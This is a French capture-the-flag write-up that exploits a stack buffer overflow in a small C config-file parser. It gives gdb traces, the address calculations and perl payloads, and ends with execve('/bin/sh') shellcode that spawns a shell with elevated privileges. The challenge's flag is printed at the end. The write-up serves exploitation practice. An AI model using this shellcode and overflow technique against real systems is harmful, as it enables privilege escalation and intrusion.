&lt;pre&gt;&lt;code&gt;$ cat prog.c
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;ctype.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;

#define BUFFER 512

struct Init
{
    char username[128];
    uid_t uid;
    pid_t pid;
};

void cpstr(char *dst, const char *src)
{
    for(; *src; src++, dst++)
        {
            *dst = *src;
        }
    *dst = 0;
}

void chomp(char *buff)
{
    for(; *buff; buff++)
        {
            if(*buff == &#39;\n&#39; || *buff == &#39;\r&#39; || *buff == &#39;\t&#39;)
            {
            *buff = 0;
            break;
            }
        }
}

struct Init Init(char *filename)
{

    FILE *file;
    struct Init init;
    char buff[BUFFER+1];


    if((file = fopen(filename, &amp;quot;r&amp;quot;)) == NULL)
        {
            perror(&amp;quot;[-] fopen &amp;quot;);
            exit(0);
        }

    memset(&amp;amp;init, 0, sizeof(struct Init));

    init.pid = getpid();
    init.uid = getuid();

    while(fgets(buff, BUFFER, file) != NULL)
        {
            chomp(buff);
            if(strncmp(buff, &amp;quot;USERNAME=&amp;quot;, 9) == 0)
            {
                cpstr(init.username, buff+9);
            }
        }
    fclose(file);
    return init;
}

int main(int argc, char **argv)
{
    struct Init init;
    if(argc != 2)
        {
            printf(&amp;quot;Usage : %s &amp;lt;config_file&amp;gt;\n&amp;quot;, argv[0]);
            exit(0);
        }
    init = Init(argv[1]);
    printf(&amp;quot;[+] Runing the program with username %s, uid %d and pid %d.\n&amp;quot;, init.username, init.uid, init.pid);

    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visiblement dans ce challenge on a un stack overflow classique dans cpstr(),mais en plus il faut faire attention à préserver certaines valeurs sur la pile. En effet dans Init(), on peut voir un:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;fclose(file);
return init;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si on ne fait pas attention à ce que `file&amp;rsquo; ait une valeur correcte, l&amp;rsquo;appel à fclose() va faire crasher l&amp;rsquo;application avant le return, et nous empêcher d&amp;rsquo;exploiter l&amp;rsquo;overflow.&lt;/p&gt;

&lt;p&gt;Typiquement le contenu du fichier devrait alors être de cette forme:&lt;/p&gt;

&lt;p&gt;&amp;ldquo;USERNAME=&amp;rdquo; [JUNK pour remplir le buffer] &amp;hellip; [file pointer] &amp;hellip; [ new eip ]&lt;/p&gt;

&lt;p&gt;Avec `new eip qui doit écraser $eip, et sauter dans du code qu&amp;rsquo;on veut donc faire exécuter.&lt;/p&gt;

&lt;p&gt;Comme notre overflow va écraser les autres éléments de la structure Init, on va faire en sorte de mettre des valeurs qui facilitent le debug: -1 pour l&amp;rsquo;uid et -2 pour le pid.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ mkdir /tmp/prout &amp;amp;&amp;amp; export binpath=/tmp/prout/foo.bin
$ export uid=&amp;quot;\xff\xff\xff\xff&amp;quot;
$ export pid=&amp;quot;\xfe\xff\xff\xff&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On va faire tourner le programme dans gdb afin de savoir la valeur retournée par fopen(), pour la restaurer avant le fclose():&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ gdb ./prog
[...]
gdb$ disas Init
[...]
    0x080485bd &amp;lt;+20&amp;gt;:    mov    DWORD PTR [esp+0x4],edx
    0x080485c1 &amp;lt;+24&amp;gt;:    mov    DWORD PTR [esp],eax
    0x080485c4 &amp;lt;+27&amp;gt;:    call   0x8048480 &amp;lt;fopen@plt&amp;gt;
    0x080485c9 &amp;lt;+32&amp;gt;:    mov    DWORD PTR [ebp-0x1c],eax
[...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On met donc un breakpoint juste apres le &lt;em&gt;fopen()&lt;/em&gt; pour connaître la valeur du pointeur (en général les valeurs de retour sont dans $eax, et la ligne +24 nous le confirme, puisqu&amp;rsquo;on empile le contenu de $eax pour passer cette valeur à &lt;em&gt;fclose()&lt;/em&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;gdb$ b *0x080485c9
Breakpoint 1 at 0x80485c9: file binary10.c, line 45.
gdb$ r /tmp/prout/foo.bin
[...]
Breakpoint 2, 0x080485c9 in Init (filename=0xbffffc80 &amp;quot;/tmp/prout/foo.bin&amp;quot;) at binary10.c:45
45      in prog.c
gdb$ i r eax
eax            0x804b008        0x804b008
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On est content, on a la valeur du FILE * qu&amp;rsquo;on désire sauver:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ export fileptr=&amp;quot;\x08\xb0\x04\x08&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ensuite on exporte notre shellcode (on peut en trouver partout sur le net)&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ export shellcode=$(perl -e &#39;print &amp;quot;\x90&amp;quot;x128 . &amp;quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&amp;quot;&#39;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On écrit ensuite un petit programme pour récupérer l&amp;rsquo;adresse d&amp;rsquo;une variable d&amp;rsquo;environnement donnée, pour un programme donné (on se met dans un répertoire avec les droits d&amp;rsquo;écriture &amp;ndash; par exemple dans /tmp):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ cat getenv.c
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int
main(int argc, char **argv)
{
        char *p = NULL;

        if(argc &amp;lt; 3) {
                fprintf(stderr, &amp;quot;Usage: %s &amp;lt;env name&amp;gt; &amp;lt;binary&amp;gt;\n&amp;quot;, argv[0]);
                return EXIT_FAILURE;
        }

        p = getenv(argv[1]);
        p += (strlen(argv[0]) - strlen(argv[2])) * 2;
        printf(&amp;quot;%s is set at %p\n&amp;quot;, argv[1], (void *) p);

        return EXIT_SUCCESS;
}
$ cc -o getenv getenv.c -m32
$ ./getenv shellcode $HOME/prog
0xbffffd47
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ok! Enfin on peut tester ce programme!&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ perl -e &#39;print &amp;quot;USERNAME=&amp;quot; . &amp;quot;A&amp;quot;x128 . &amp;quot;&#39;$uid&#39;&amp;quot; . &amp;quot;&#39;$pid&#39;&amp;quot; . &amp;quot;&#39;$fileptr&#39;&amp;quot; . &amp;quot;B&amp;quot;x32 . &amp;quot;\x47\xfd\xff\xbf&amp;quot;&#39; &amp;gt; &amp;quot;$binpath&amp;quot;  &amp;amp;&amp;amp; ./ch10 &amp;quot;$binpath&amp;quot;
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pour avoir des infos supplémentaires je copie le binaire dans /tmp/prout:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ cp ./prog /tmp/prout
$ ulimit -c unlimited
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Maintenant un SIGSEGV me donnera quelque chose a manger:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ perl -e &#39;print &amp;quot;USERNAME=&amp;quot; . &amp;quot;A&amp;quot;x128 . &amp;quot;&#39;$uid&#39;&amp;quot; . &amp;quot;&#39;$pid&#39;&amp;quot; . &amp;quot;&#39;$fileptr&#39;&amp;quot; . &amp;quot;B&amp;quot;x32 . &amp;quot;\x47\xfd\xff\xbf&amp;quot;&#39; &amp;gt; &amp;quot;$binpath&amp;quot;  &amp;amp;&amp;amp; ./ch10 &amp;quot;$binpath&amp;quot;
Segmentation fault (core dumped)
$ gdb ./prog core
Core was generated by `./prog /tmp/prout/foo.bin&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0x42424242 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ah? Je me serais planté de 4 bytes pour l&amp;rsquo;adresse dans la stack ou je devrais écraser $eip? Ok&amp;hellip; bon ben on décale alors, histoire de faire coïncider l&amp;rsquo;adresse du shellcode dans l&amp;rsquo;environnement avec $eip. On insère donc 28x&amp;rdquo;B&amp;rdquo; au lieu de 32, et on rajoute un gentil petit canary apres l&amp;rsquo;adresse, au cas où.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ perl -e &#39;print &amp;quot;USERNAME=&amp;quot; . &amp;quot;A&amp;quot;x128 . &amp;quot;&#39;$uid&#39;&amp;quot; . &amp;quot;&#39;$pid&#39;&amp;quot; . &amp;quot;&#39;$fileptr&#39;&amp;quot; . &amp;quot;B&amp;quot;x28 . &amp;quot;\x47\xfd\xff\xbf&amp;quot; . &amp;quot;C&amp;quot;x4&#39; &amp;gt; &amp;quot;$binpath&amp;quot;  &amp;amp;&amp;amp; ./prog &amp;quot;$binpath&amp;quot;
Segmentation fault (core dumped)
[...]
Core was generated by `./prog /tmp/prout/foo.bin&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0x080486aa in Init (filename=0xbffffb00 &amp;quot;T\377\377\277u\377\377\277~\377\377\277\227\377\377\277\316\377\377\277\327\377\377\277\354\377\377\277&amp;quot;) at binary10.c:65
65      binary10.c: No such file or directory.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Euh? Bon, si on regarde le code assembleur, on remarque que l&amp;rsquo;épilogue de la fonction Init() est différent de l&amp;rsquo;ordinaire. De même que dans main(), on réserve de la place pour le &amp;lsquo;struct Init Init&amp;rsquo; qui sera retourné par Init() Donc l&amp;rsquo;espace sur la stack va être écrasé par la copie de l&amp;rsquo;objet de type &amp;lsquo;struct init&amp;rsquo;&amp;hellip; ce qui va écraser tout ce qu&amp;rsquo;on avait pris soin de construire avec nos petits doigts boudinés. En effet, en sortie de Init(), on a:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[...]
0x08048699 &amp;lt;+240&amp;gt;:   lea    ebx,[ebp-0xa4]
0x0804869f &amp;lt;+246&amp;gt;:   mov    eax,0x22
0x080486a4 &amp;lt;+251&amp;gt;:   mov    edi,edx
0x080486a6 &amp;lt;+253&amp;gt;:   mov    esi,ebx
0x080486a8 &amp;lt;+255&amp;gt;:   mov    ecx,eax
0x080486aa &amp;lt;+257&amp;gt;:   rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
0x080486ac &amp;lt;+259&amp;gt;:   mov    eax,DWORD PTR [ebp+0x8]
0x080486af &amp;lt;+262&amp;gt;:   add    esp,0x2ac
0x080486b5 &amp;lt;+268&amp;gt;:   pop    ebx
0x080486b6 &amp;lt;+269&amp;gt;:   pop    esi
0x080486b7 &amp;lt;+270&amp;gt;:   pop    edi
0x080486b8 &amp;lt;+271&amp;gt;:   pop    ebp
0x080486b9 &amp;lt;+272&amp;gt;:   ret    0x4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On fait encore quelques tests, en mettant que des \x47\xfd\xff\xbf a la place des &amp;ldquo;B&amp;rdquo;, pour valider cette hypothèse:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ perl -e &#39;print &amp;quot;USERNAME=&amp;quot; . &amp;quot;A&amp;quot;x128 . &amp;quot;&#39;$uid&#39;&amp;quot; . &amp;quot;&#39;$pid&#39;&amp;quot; . &amp;quot;&#39;$fileptr&#39;&amp;quot; . &amp;quot;\x47\xfd\xff\xbf&amp;quot;x8 . &amp;quot;C&amp;quot;x4&#39; &amp;gt; &amp;quot;$binpath&amp;quot;  &amp;amp;&amp;amp; ./prog &amp;quot;$binpath&amp;quot;
Illegal instruction (core dumped)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bon! Inspectons ça un peu mieux: on met un breakpoint juste avant le `ret&amp;rsquo; de la fonction Init(), puis on exécute une instruction:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;gdb$ ni
0xbffffd47 in ?? ()

gdb$ x/16x 0xbffffd47
0xbffffd47:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffd57:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffd67:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffd77:     0x41414141      0x41414141      0x41414141      0x41414141
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Hop, direct dans le buffer&amp;hellip; Du coup, l&amp;rsquo;idée est que plutôt d&amp;rsquo;utiliser une variable d&amp;rsquo;environnement à l&amp;rsquo;adresse de laquelle on souhaite sauter, on va directement insérer notre shellcode dans le buffer init.username qu&amp;rsquo;on remplit en lisant le fichier. Comme le buffer fait 128 bytes et que le shellcode fait 25 bytes, on préfixe avec 103 NOP (0x90), et on termine avec ce qu&amp;rsquo;on souhaite faire exécuter:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ export shbuf=$(perl -e &#39;print &amp;quot;\x90&amp;quot;x103 . &amp;quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&amp;quot;&#39;)
$ perl -e &#39;print &amp;quot;USERNAME=&amp;quot; . &amp;quot;&#39;$shbuf&#39;&amp;quot; . &amp;quot;&#39;$uid&#39;&amp;quot; . &amp;quot;&#39;$pid&#39;&amp;quot; . &amp;quot;&#39;$fileptr&#39;&amp;quot; . &amp;quot;B&amp;quot;x28 . &amp;quot;\x47\xfd\xff\xbf&amp;quot;x2&#39; &amp;gt; &amp;quot;$binpath&amp;quot;  &amp;amp;&amp;amp; ./prog&amp;quot;$binpath&amp;quot;
sh-4.2$
sh-4.2$ id
uid=1110(user) gid=1110(user) euid=1210(user-cracked) groups=1210(user-cracked),100(users),1110(user)
sh-4.2$ cat .passwd
Tirelipimponsurlechiwawa!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Et youpi les knackis, on peut valider ce challenge!&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>